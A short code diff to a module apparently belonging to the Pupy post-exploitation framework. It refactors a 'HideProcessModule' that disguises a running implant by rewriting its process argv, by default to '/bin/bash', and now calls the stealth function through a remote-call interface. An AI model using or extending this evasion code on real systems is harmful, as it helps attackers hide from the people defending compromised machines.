@@ -1,4 +1,4 @@
-# -*- coding: UTF8 -*-
+# -*- coding: utf-8 -*-
 from pupylib.PupyModule import *
 
 __class_name__="HideProcessModule"
@@ -13,6 +13,7 @@ class HideProcessModule(PupyModule):
         self.arg_parser.add_argument('--argv', default="/bin/bash", help='change the new process argv')
 
     def run(self, args):
-        self.client.conn.modules['pupystealth.change_argv'].change_argv(argv=args.argv)
-        self.success("process argv and env changed !")
+        change_argv = self.client.remote('pupystealth.change_argv', 'change_argv')
 
+        change_argv(argv=args.argv)
+        self.success("process argv and env changed !")
